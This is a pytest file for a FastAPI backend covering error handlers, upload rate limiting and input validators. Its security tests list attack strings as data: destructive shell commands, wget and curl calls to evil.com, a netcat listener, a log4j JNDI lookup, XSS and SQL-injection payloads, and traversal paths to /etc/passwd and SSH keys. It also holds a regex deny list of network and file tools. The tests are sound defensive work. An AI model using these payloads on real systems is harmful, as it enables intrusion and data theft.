#!/usr/bin/env python3
"""
Comprehensive Pytest Tests for HTTP Error Code Fixes
Tests all actual implemented fixes with proper validation
"""

import pytest
import sys
import asyncio
from unittest.mock import AsyncMock, MagicMock, patch
from fastapi import HTTPException, status
sys.path.append('backend')

class TestHTTPErrorHandlers:
    """Test HTTP error handler functionality"""
    
    @pytest.mark.asyncio
    async def test_error_handler_module_structure(self):
        """Test that error handler module has required functions"""
        from error_handlers import http_exception_handler
        
        # Test that handler exists and is callable
        assert callable(http_exception_handler)
        
        # Test basic functionality with mock request
        request = MagicMock()
        exception = HTTPException(status_code=404, detail="Not Found")
        
        response = await http_exception_handler(request, exception)
        assert response.status_code == 404
    
    @pytest.mark.asyncio
    async def test_3xx_error_codes(self):
        """Test 3xx redirection error codes"""
        from error_handlers import http_exception_handler
        
        test_cases = [
            (300, "Multiple Choices"),
            (301, "Moved Permanently"),
            (307, "Temporary Redirect"),
            (308, "Permanent Redirect")
        ]
        
        request = MagicMock()
        
        for code, description in test_cases:
            exception = HTTPException(status_code=code, detail=description)
            response = await http_exception_handler(request, exception)
            assert response.status_code == code
    
    @pytest.mark.asyncio
    async def test_4xx_error_codes(self):
        """Test 4xx client error codes"""
        from error_handlers import http_exception_handler
        
        test_cases = [
            (400, "Bad Request"),
            (401, "Unauthorized"),
            (403, "Forbidden"),
            (404, "Not Found"),
            (405, "Method Not Allowed"),
            (429, "Too Many Requests")
        ]
        
        request = MagicMock()
        
        for code, description in test_cases:
            exception = HTTPException(status_code=code, detail=description)
            response = await http_exception_handler(request, exception)
            assert response.status_code == code
    
    @pytest.mark.asyncio
    async def test_5xx_error_codes(self):
        """Test 5xx server error codes"""
        from error_handlers import http_exception_handler
        
        test_cases = [
            (500, "Internal Server Error"),
            (502, "Bad Gateway"),
            (503, "Service Unavailable"),
            (504, "Gateway Timeout")
        ]
        
        request = MagicMock()
        
        for code, description in test_cases:
            exception = HTTPException(status_code=code, detail=description)
            response = await http_exception_handler(request, exception)
            assert response.status_code == code

class TestRateLimiting:
    """Test rate limiting implementation"""
    
    def test_rate_limiter_creation(self):
        """Test rate limiter creation and configuration"""
        from routes.files import upload_init_limiter, upload_chunk_limiter, upload_complete_limiter
        
        # Test upload init limiter
        assert upload_init_limiter.max_requests == 10
        assert upload_init_limiter.window_seconds == 60
        
        # Test chunk upload limiter
        assert upload_chunk_limiter.max_requests == 60
        assert upload_chunk_limiter.window_seconds == 60
        
        # Test complete upload limiter
        assert upload_complete_limiter.max_requests == 10
        assert upload_complete_limiter.window_seconds == 60
    
    def test_rate_limiter_functionality(self):
        """Test rate limiter allows and blocks requests correctly"""
        from routes.files import upload_init_limiter
        
        test_user = "test_user"
        
        # Test normal operation
        for i in range(3):
            assert upload_init_limiter.is_allowed(test_user) == True
        
        # Test rate limit exceeded
        for i in range(12):
            upload_init_limiter.is_allowed(test_user)
        
        # Should now be blocked
        assert upload_init_limiter.is_allowed(test_user) == False
    
    def test_retry_after_calculation(self):
        """Test retry after calculation"""
        from routes.files import upload_init_limiter
        
        test_user = "test_user"
        
        # Exhaust rate limit
        for i in range(12):
            upload_init_limiter.is_allowed(test_user)
        
        # Test retry after calculation
        retry_after = upload_init_limiter.get_retry_after(test_user)
        assert isinstance(retry_after, (int, float))
        assert retry_after > 0

class TestSecurityValidators:
    """Test security validator functions"""
    
    def test_command_injection_validation(self):
        """Test command injection prevention"""
        from validators import validate_command_injection
        
        # Test safe inputs
        safe_inputs = [
            "normal_filename.pdf",
            "document_123.txt",
            "user-profile-image.jpg",
            "my file (1).docx"
        ]
        
        for safe_input in safe_inputs:
            assert validate_command_injection(safe_input) == True
        
        # Test dangerous inputs
        dangerous_inputs = [
            "cat /etc/passwd",
            "rm -rf /",
            "ls; whoami",
            "wget http://evil.com",
            "curl -X POST http://evil.com",
            "nc -l -p 4444",
            "chmod 777 /etc/shadow",
            "eval('malicious code')",
            "exec('system command')",
            "system('rm -rf /')",
            "$(whoami)",
            "${HOME}/.bashrc",
            "cat|grep password",
            "ls && rm file",
            "wget || curl evil.com"
        ]
        
        for dangerous_input in dangerous_inputs:
            assert validate_command_injection(dangerous_input) == False
    
    def test_path_traversal_validation(self):
        """Test path traversal prevention"""
        from validators import validate_path_injection
        
        # Test safe paths
        safe_paths = [
            "documents/file.pdf",
            "uploads/image.jpg",
            "user_files/data.txt",
            "normal/path/to/file.doc"
        ]
        
        for safe_path in safe_paths:
            assert validate_path_injection(safe_path) == True
        
        # Test dangerous paths
        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%c0%af%c0%af%c0%afetc%c0%afpasswd",
            "....//....//....//etc/passwd",
            "file\x00.txt",
            "normal/../../../etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/etc/passwd",
            "C:\\Windows\\System32",
            "~/.ssh/id_rsa"
        ]
        
        for dangerous_path in dangerous_paths:
            assert validate_path_injection(dangerous_path) == False
    
    def test_input_sanitization(self):
        """Test input sanitization"""
        from validators import sanitize_input
        
        # Test malicious inputs
        malicious_inputs = [
            '<script>alert("xss")</script>',
            'javascript:alert("xss")',
            'data:text/html,<script>alert("xss")</script>',
            "'; DROP TABLE users; --",
            '${jndi:ldap://evil.com/a}',
            '{{7*7}}',
            '<img src=x onerror=alert(1)>',
            '"><script>alert(1)</script>',
            '\x00\x01\x02\x03'
        ]
        
        for malicious_input in malicious_inputs:
            sanitized = sanitize_input(malicious_input)
            
            # Check that dangerous patterns are removed
            dangerous_patterns = ['script', 'javascript:', 'data:', 'vbscript:', 'drop table', '${', '{{', '<', '>', '\x00']
            
            for pattern in dangerous_patterns:
                assert pattern not in sanitized.lower(), f"Pattern '{pattern}' found in sanitized input: {sanitized}"
    
    def test_file_extension_blocking(self):
        """Test file extension blocking - only truly dangerous files blocked"""
        from security import SecurityConfig
        
        # Only block truly dangerous extensions (user requested .exe, .js, .msi to be allowed)
        dangerous_exts = [
            '.bat', '.bin', '.cfg', '.class', '.cmd', '.com', '.conf', '.config', 
            '.desktop', '.dll', '.docm', '.dotm', '.dylib', '.fla', '.inf', '.ini', 
            '.jar', '.lnk', '.o', '.pif', '.plist', '.potm', '.pptm', '.reg', 
            '.run', '.scr', '.so', '.swf', '.url', '.vbs', '.webloc', '.xlsm', '.xltm'
        ]
        
        for ext in dangerous_exts:
            assert ext in SecurityConfig.BLOCKED_FILE_EXTENSIONS, f"Dangerous extension {ext} not blocked"
        
        # Verify user-requested extensions are allowed (except truly dangerous ones)
        allowed_exts = [
            '.exe', '.js', '.php', '.asp', '.jsp', '.sh', 
            '.py', '.rb', '.pl', '.msi', '.app', '.deb', '.rpm', '.dmg', '.pkg'
        ]
        
        for ext in allowed_exts:
            assert ext not in SecurityConfig.BLOCKED_FILE_EXTENSIONS, f"User-requested extension {ext} should not be blocked"

class TestDatabaseConnectionHandling:
    """Test database connection handling"""
    
    @pytest.mark.asyncio
    async def test_database_connection_validation(self):
        """Test database connection validation"""
        from database import get_db
        
        # Test that get_db returns a database object
        db = get_db()
        assert db is not None
    
    @pytest.mark.asyncio
    async def test_database_timeout_handling(self):
        """Test database timeout handling"""
        from routes.users import get_current_user_profile
        
        # Mock database timeout
        with patch('routes.users.asyncio.wait_for') as mock_wait:
            mock_wait.side_effect = asyncio.TimeoutError("Database timeout")
            
            with pytest.raises(HTTPException) as exc_info:
                await get_current_user_profile("test_user")
            
            assert exc_info.value.status_code == 504  # Gateway Timeout

class TestFileUploadFlow:
    """Test file upload flow with error handling"""
    
    @pytest.mark.asyncio
    async def test_upload_init_rate_limiting(self):
        """Test upload initialization rate limiting"""
        from routes.files import initialize_upload
        
        # Mock rate limiter to return False
        with patch('routes.files.upload_init_limiter') as mock_limiter:
            mock_limiter.is_allowed.return_value = False
            
            request = MagicMock()
            request.json = AsyncMock(return_value={"filename": "test.pdf"})
            
            with pytest.raises(HTTPException) as exc_info:
                await initialize_upload(request, "test_user")
            
            assert exc_info.value.status_code == 429  # Too Many Requests

    @pytest.mark.asyncio
    async def test_complete_upload_checksum_none_returns_empty_string(self, tmp_path):
        from routes.files import complete_upload

        upload_id = "upload_test_checksum_none"
        current_user = "user_1234567890abcdef12345678"
        chunk_bytes = b"hello-world"

        data_root = tmp_path / "data"
        upload_dir = data_root / "tmp" / upload_id
        upload_dir.mkdir(parents=True, exist_ok=True)
        (upload_dir / "chunk_0.part").write_bytes(chunk_bytes)

        upload_doc = {
            "_id": upload_id,
            "user_id": current_user,
            "total_chunks": 1,
            "uploaded_chunks": [0],
            "filename": "x.txt",
            "size": len(chunk_bytes),
            "mime_type": "text/plain",
            "chat_id": None,
            "checksum": None,
        }

        class _UploadsColl:
            def find_one(self, query):
                return AsyncMock(return_value=upload_doc)()

            def delete_one(self, query):
                return AsyncMock(return_value=MagicMock(deleted_count=1))()

        class _FilesColl:
            def insert_one(self, doc):
                return AsyncMock(return_value=MagicMock(inserted_id=doc.get("_id")))()

        request = MagicMock()
        request.client = None

        with patch("routes.files.upload_complete_limiter") as mock_limiter, \
             patch("routes.files.settings") as mock_settings, \
             patch("routes.files.uploads_collection", return_value=_UploadsColl()), \
             patch("routes.files.files_collection", return_value=_FilesColl()), \
             patch("routes.files.get_db", return_value=MagicMock()):

            mock_limiter.is_allowed.return_value = True
            mock_settings.DATA_ROOT = data_root

            resp = await complete_upload(upload_id, request, current_user)
            assert resp.file_id
            assert resp.filename == "x.txt"
            assert resp.size == len(chunk_bytes)
            assert resp.checksum == ""
            assert resp.storage_path
    
    @pytest.mark.asyncio
    async def test_chunk_upload_rate_limiting(self):
        """Test chunk upload rate limiting"""
        from routes.files import upload_chunk
        
        # Mock rate limiter to return False
        with patch('routes.files.upload_chunk_limiter') as mock_limiter:
            mock_limiter.is_allowed.return_value = False
            
            request = MagicMock()
            request.body = AsyncMock(return_value=b"chunk_data")
            
            with pytest.raises(HTTPException) as exc_info:
                await upload_chunk("upload_123", request, 0, "test_user")
            
            assert exc_info.value.status_code == 429  # Too Many Requests
    
    @pytest.mark.asyncio
    async def test_complete_upload_rate_limiting(self):
        """Test complete upload rate limiting"""
        from routes.files import complete_upload
        
        # Mock rate limiter to return False
        with patch('routes.files.upload_complete_limiter') as mock_limiter:
            mock_limiter.is_allowed.return_value = False
            
            request = MagicMock()
            
            with pytest.raises(HTTPException) as exc_info:
                await complete_upload("upload_123", request, "test_user")
            
            assert exc_info.value.status_code == 429  # Too Many Requests

class TestRegexPatterns:
    """Test regex patterns for correctness"""
    
    def test_command_injection_regex_patterns(self):
        """Test command injection regex patterns"""
        import re
        
        # Test patterns from validators.py
        dangerous_patterns = [
            r'[;&|`$<>]',
            r'\|\|',
            r'&&',
            r'>>',
            r'<<',
            r'<\(',
            r'\$\(',
            r'\$\{',
            r'eval\s*\(',
            r'exec\s*\(',
            r'system\s*\(',
            r'popen\s*\(',
            r'shell\s*=\s*["\']?true["\']?',
            r'cat\s+/',
            r'passwd',
            r'shadow',
            r'hosts',
            r'crontab',
            r'wget\s+',
            r'curl\s+',
            r'nc\s+',
            r'netcat',
            r'chmod\s+',
            r'chown\s+',
            r'rm\s+',
            r'rmdir\s+',
            r'mv\s+',
            r'cp\s+',
            r'dd\s+',
        ]
        
        # Test that patterns compile correctly
        for pattern in dangerous_patterns:
            try:
                re.compile(pattern)
            except re.error as e:
                pytest.fail(f"Invalid regex pattern '{pattern}': {e}")
    
    def test_path_traversal_regex_patterns(self):
        """Test path traversal regex patterns"""
        import re
        
        # Test patterns from validators.py
        path_patterns = [
            r'\.\.[/\\]',
            r'%2e%2e%2f',
            r'%2e%2e%5c',
            r'%2e%2e%2f%2e%2e%2f',
            r'%c0%af',
            r'%c1%9c',
            r'%252e%252e%252f',
            r'%252e%252e%255c',
            r'..%252f..%252f..%252f',
            r'..%255c..%255c..%255c',
        ]
        
        # Test that patterns compile correctly
        for pattern in path_patterns:
            try:
                re.compile(pattern)
            except re.error as e:
                pytest.fail(f"Invalid regex pattern '{pattern}': {e}")

if __name__ == "__main__":
    pytest.main([__file__, "-v"])
